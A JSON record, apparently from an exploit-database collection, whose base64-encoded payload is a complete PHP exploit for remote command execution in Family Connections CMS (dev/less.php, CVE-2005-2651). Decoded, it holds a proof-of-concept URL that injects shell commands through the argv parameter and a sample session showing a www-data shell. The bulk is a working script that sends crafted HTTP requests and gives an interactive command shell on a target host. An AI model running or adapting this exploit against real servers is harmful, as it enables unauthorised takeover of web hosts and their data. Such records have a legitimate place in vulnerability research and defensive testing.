{
    "source": "exploit-database", 
    "exploit": "PD9waHANCi8qDQpGYW1pbHkgY29ubmVjdGlvbnMgQ01TIHYyLjUuMC12Mi43LjEgcmVtb3RlIGNvbW1hbmQgZXhlY3V0aW9uIGV4cGxvaXQNCnZlbmRvcl9fX19fX19fXzogaHR0cHM6Ly93d3cuZmFtaWx5Y21zLmNvbS8NCnNvZnR3YXJlIGxpbmtfXzogaHR0cHM6Ly93d3cuZmFtaWx5Y21zLmNvbS9kb3dubG9hZC5waHANCmF1dGhvcl9fX19fX19fXzogbXJfbWU6OnJ3eCBrcnUNCmVtYWlsX19fX19fX19fXzogc3RldmVudGhvbWFzc2VlbGV5IWdtYWlsIWNvbQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KcGhwLmluaSByZXF1aXJlbWVudHM6IA0KcmVnaXN0ZXJfZ2xvYmFscz1Pbg0KcmVnaXN0ZXJfYXJnY19hcmd2PU9mZg0KDQpUaGlzIGJ1ZyBpcyBhbG1vc3QgaWRlbnRpY2FsIHRvIENWRS0yMDA1LTI2NTENCnBvYzogaHR0cDovLzE5Mi4xNjguMjIwLjEyOC9bcGF0aF0vZGV2L2xlc3MucGhwP2FyZ3ZbMV09fGlkOw0KDQpUaGUgdnVsbmVyYWJsZSBjb2RlIGlzIG9uIGxpbmVzIDIwLTM2IGluIC4vZGV2L2xlc3MucGhwOg0KLS0+DQokdGhlbWUgPSBpc3NldCgkYXJndlsxXSkgPyAkYXJndlsxXSA6ICdkZWZhdWx0JzsNCg0Kc3lzdGVtKCJjbGVhciIpOw0KDQppZiAoZmlsZV9leGlzdHMoIiRkaXIvdGhlbWVzLyR0aGVtZS9zdHlsZS5jc3MiKSkNCnsNCiAgICBlY2hvICJcblsgdGhlbWVzLyR0aGVtZS9zdHlsZS5jc3MgXSBhbHJlYWR5IGV4aXN0cy5cblxuIjsNCiAgICBlY2hvICJPdmVyd3JpdGUgWyB5L24gXSA/ICI7DQogICAgJGhhbmRsZSA9IGZvcGVuICgicGhwOi8vc3RkaW4iLCJyIik7DQogICAgJGxpbmUgPSBmZ2V0cygkaGFuZGxlKTsNCiAgICBpZiAodHJpbSgkbGluZSkgIT0gJ3knKQ0KICAgIHsNCiAgICAgICAgZXhpdDsNCiAgICB9DQp9DQoNCiR3b3JrZWQgPSBzeXN0ZW0oInBocCAtcSB+L2Jpbi9sZXNzcGhwL2xlc3NjICRkaXIvdGhlbWVzLyR0aGVtZS9kZXYubGVzcyA+ICRkaXIvdGhlbWVzLyR0aGVtZS9zdHlsZS5jc3MiKTsNCjwtLQ0KDQpUaW1lbGluZToNCi0gTm92IDI4dGggZGlzY292ZXJlZCBhbmQgcmVwb3J0ZWQgdXNpbmcgdGlja2V0IDQwNyAoaHR0cDovL3NvdXJjZWZvcmdlLm5ldC9hcHBzL3RyYWMvZmFtLWNvbm5lY3Rpb25zL3RpY2tldC80MDcpDQotIERlYyAybmQsIHZlbmRvcnMgc3RhdGVkIHRoYXQgdGhleSB3aWxsIGZpeCB0aGUgaXNzdWUNCi0gRGVjIDR0aCwgdmVuZG9ycyBrZWVwIHB1c2hpbmcgYmFjayByZWxlYXNlIDIuNy4yIHdpdGggbm8gcHJvcGVyIHBsYW5uZWQgZGF0ZQ0KLSBEZWMgNHRoLCBQdWJsaWMgZGlzY2xvc3VyZQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCm1yX21lQGdsaWVzZTp+L3BlbnRlc3Qvd2ViLzBkYXkvZmNtcyQgcGhwIHBvYy5waHAgLXQgMTkyLjE2OC4yMjAuMTI4IC93ZWJhcHBzL0ZDTVNfMi43LjEvIC1wIDEyNy4wLjAuMTo4MDgwDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpGYW1pbHkgQ29ubmVjdGlvbnMgQ01TIHYyLjUuMC12Mi43LjEgKGxlc3MucGhwKSByZW1vdGUgY29tbWFuZCBleGVjdXRpb24gZXhwbG9pdA0KYnkgbXJfbWUgb2Ygcnd4IGtydSAtIG5ldC1uaW5qYS5uZXQgLyByd3guYml6Lm5mDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KKCspIFNldHRpbmcgdGhlIHByb3h5IHRvIDEyNy4wLjAuMTo4MDgwDQoNCm1yX21lQDE5Mi4xNjguMjIwLjEyOCMgaWQNCnVpZD0zMyh3d3ctZGF0YSkgZ2lkPTMzKHd3dy1kYXRhKSBncm91cHM9MzMod3d3LWRhdGEpDQptcl9tZUAxOTIuMTY4LjIyMC4xMjgjIHVuYW1lIC1hDQpMaW51eCBzdGV2ZS13ZWItc2VydmVyIDIuNi4zNS0zMS1nZW5lcmljICM2Mi1VYnVudHUgU01QIFR1ZSBOb3YgOCAxNDowMDozMCBVVEMgMjAxMSBpNjg2IEdOVS9MaW51eA0KbXJfbWVAMTkyLjE2OC4yMjAuMTI4IyBxDQoqLw0KDQpwcmludF9yKCINCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpGYW1pbHkgQ29ubmVjdGlvbnMgQ01TIHYyLjUuMC12Mi43LjEgKGxlc3MucGhwKSByZW1vdGUgY29tbWFuZCBleGVjdXRpb24gZXhwbG9pdA0KYnkgbXJfbWUgb2Ygcnd4IGtydSAtIG5ldC1uaW5qYS5uZXQgLyByd3guYml6Lm5mDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIik7DQoNCmlmICgkYXJnYyA8IDMpIHsNCnByaW50X3IoIg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NClVzYWdlOiBwaHAgIi4kYXJndlswXS4iIC10IDxob3N0OmlwPiAtZCA8cGF0aD4gT1BUSU9OUw0KaG9zdDogICAgICB0YXJnZXQgc2VydmVyIChpcC9ob3N0bmFtZSkNCnBhdGg6ICAgICAgZGlyZWN0b3J5IHBhdGggdG8gd29yZHByZXNzDQpPcHRpb25zOg0KIC1wW2lwOnBvcnRdOiBzcGVjaWZ5IGEgcHJveHkNCkV4YW1wbGU6DQpwaHAgIi4kYXJndlswXS4iIC10IDE5Mi4xNjguMS41IC1kIC93cC8gLXAgMTI3LjAuMC4xOjgwODANCnBocCAiLiRhcmd2WzBdLiIgLXQgMTkyLjE2OC4xLjUgLWQgL3dwLw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiIpOyBkaWU7IA0KfQ0KDQplcnJvcl9yZXBvcnRpbmcoNyk7DQppbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLCAwKTsNCmluaV9zZXQoImRlZmF1bHRfc29ja2V0X3RpbWVvdXQiLCA1KTsNCg0KJHByb3h5X3JlZ2V4ID0gIihcYlxkezEsM31cLlxkezEsM31cLlxkezEsM31cLlxkezEsM31cYikiOw0KDQpmdW5jdGlvbiBzZXRBcmdzKCRhcmd2KXsNCgkkX0FSRyA9IGFycmF5KCk7DQoJZm9yZWFjaCAoJGFyZ3YgYXMgJGFyZyl7DQoJCWlmIChlcmVnKCItLShbXj1dKyk9KC4qKSIsICRhcmcsICRyZWcpKXsNCgkJCSRfQVJHWyRyZWdbMV1dID0gJHJlZ1syXTsNCgkJfWVsc2VpZihlcmVnKCJeLShbYS16QS1aMC05XSkiLCAkYXJnLCAkcmVnKSl7DQoJCQkkX0FSR1skcmVnWzFdXSA9ICJ0cnVlIjsNCgkJfWVsc2Ugew0KCQkJJF9BUkdbImlucHV0Il1bXSA9ICRhcmc7DQoJCX0NCgl9DQoJcmV0dXJuICRfQVJHOw0KfQ0KDQoNCiRteUFyZ3MgPSBzZXRBcmdzKCRhcmd2KTsNCiRob3N0ID0gJG15QXJnc1siaW5wdXQiXVsiMSJdOw0KJHBhdGggPSAkbXlBcmdzWyJpbnB1dCJdWyIyIl07DQoNCmlmIChzdHJwb3MoJGhvc3QsICI6IikgPT0gdHJ1ZSl7DQoJJGhvc3RBbmRQb3J0ID0gZXhwbG9kZSgiOiIsJG15QXJnc1siaW5wdXQiXVsxXSk7DQoJJGhvc3QgPSAkaG9zdEFuZFBvcnRbMF07DQoJJHBvcnQgPSAoaW50KSRob3N0QW5kUG9ydFsxXTsNCn1lbHNlew0KCSRwb3J0ID0gODA7DQp9DQoNCg0KaWYoc3RyY21wKCRteUFyZ3NbInAiXSwidHJ1ZSIpID09PSAwKXsNCgkkcHJveHlBbmRQb3J0ID0gZXhwbG9kZSgiOiIsJG15QXJnc1siaW5wdXQiXVszXSk7DQoJJHByb3h5ID0gJHByb3h5QW5kUG9ydFswXTsNCgkkcHBvcnQgPSAkcHJveHlBbmRQb3J0WzFdOw0KCWVjaG8gIigrKSBTZXR0aW5nIHRoZSBwcm94eSB0byAiLiRwcm94eS4iOiIuJHBwb3J0LiJcclxuIjsNCn1lbHNlew0KICAgIAllY2hvICIoLSkgV2FybmluZywgYSBwcm94eSB3YXMgbm90IHNldFxyXG4iOw0KfQ0KDQovLyByZ29kcyBzZW5kcGFja2V0aWkoKSBmdW5jdGlvbg0KZnVuY3Rpb24gc2VuZHBhY2tldCgkcGFja2V0KXsNCglnbG9iYWwgJG15QXJncywgJHByb3h5LCAkaG9zdCwgJHBwb3J0LCAkcG9ydCwgJGh0bWwsICRwcm94eV9yZWdleDsNCglpZiAoc3RyY21wKCRteUFyZ3NbInAiXSwidHJ1ZSIpICE9IDApIHsNCgkJJG9jayA9IGZzb2Nrb3BlbihnZXRob3N0YnluYW1lKCRob3N0KSwkcG9ydCk7DQoJCWlmICghJG9jaykgew0KCQkJZWNobyAiKC0pIE5vIHJlc3BvbnNlIGZyb20gIi4kaG9zdC4iOiIuJHBvcnQ7IGRpZTsNCgkJfQ0KCX0NCgllbHNlIHsNCgkJJGMgPSBwcmVnX21hdGNoKCRwcm94eV9yZWdleCwkcHJveHkpOw0KCQlpZiAoISRjKSB7DQoJCQllY2hvICIoLSkgTm90IGEgdmFsaWQgcHJveHkuLi5cbiI7IGRpZTsNCgkJfQ0KCQkkb2NrPWZzb2Nrb3BlbigkcHJveHksJHBwb3J0KTsNCgkJaWYgKCEkb2NrKSB7DQoJCQllY2hvICIoLSkgTm8gcmVzcG9uc2UgZnJvbSBwcm94eS4uLiI7IGRpZTsNCgkJfQ0KCX0NCglmcHV0cygkb2NrLCRwYWNrZXQpOw0KCWlmICgkcHJveHkgPT0gIiIpIHsNCgkJJGh0bWwgPSAiIjsNCgkJd2hpbGUgKCFmZW9mKCRvY2spKSB7DQoJCQkkaHRtbCAuPSBmZ2V0cygkb2NrKTsNCgkJfQ0KCX1lbHNlIHsNCgkJJGh0bWwgPSAiIjsNCgkJd2hpbGUgKCghZmVvZigkb2NrKSkgb3IgKCFlcmVnaShjaHIoMHgwZCkuY2hyKDB4MGEpLmNocigweDBkKS5jaHIoMHgwYSksICRodG1sKSkpIHsNCgkJCSRodG1sIC49IGZyZWFkKCRvY2ssMSk7DQoJCX0NCgl9DQoJZmNsb3NlKCRvY2spOw0KfQ0KDQppZiAoc3RyY21wKCRteUFyZ3NbInAiXSwgInRydWUiKSAhPSAwKSB7JHAgPSAkcGF0aDt9IGVsc2UgeyRwID0gImh0dHA6Ly8iLiRob3N0LiI6Ii4kcG9ydC4kcGF0aDt9DQoNCmZ1bmN0aW9uIHJlYWQoKXsNCgkkZnAxID0gZm9wZW4oIi9kZXYvc3RkaW4iLCAiciIpOw0KCSRpbnB1dCA9IGZnZXRzKCRmcDEsIDI1NSk7DQoJZmNsb3NlKCRmcDEpOw0KCXJldHVybiAkaW5wdXQ7DQp9DQoNCndoaWxlICgkY21kICE9ICJxIil7DQoJZWNobyAiXG4iLmdldF9jdXJyZW50X3VzZXIoKS4iQCIuJGhvc3QuIiMgIjsNCgkkY21kID0gdHJpbShyZWFkKCkpOw0KCSRjID0gdXJsZW5jb2RlKCJlY2hvIGZjbXNfc3RhcnQ7Ii4kY21kLiI7ZWNobyBmY21zX2VuZCIpOw0KCSRwYWNrZXQgPSAiR0VUICIuJHAuImRldi9sZXNzLnBocD9hcmd2WzFdPXwiLiRjLiI7IEhUVFAvMS4xXHJcbiI7DQoJJHBhY2tldCAuPSAiaG9zdDogIi4kaG9zdC4iXHJcblxyXG4iOw0KCWlmICgkY21kICE9ICJxIil7DQoJCXNlbmRwYWNrZXQoJHBhY2tldCk7DQoJCSRodG1sID0gZXhwbG9kZSgiZmNtc19zdGFydCIsJGh0bWwpOw0KCQkkX19fcmVzcG9uc2UgPSBleHBsb2RlKCJmY21zX2VuZCIsJGh0bWxbMl0pOw0KCQllY2hvICh0cmltKCRfX19yZXNwb25zZVswXSkpOw0KICAgIAl9DQp9DQo/Pg==", 
    "filename": "platforms/php/webapps/18198.php", 
    "id": "18198", 
    "cves": [
        "CVE-2005-2651"
    ]
}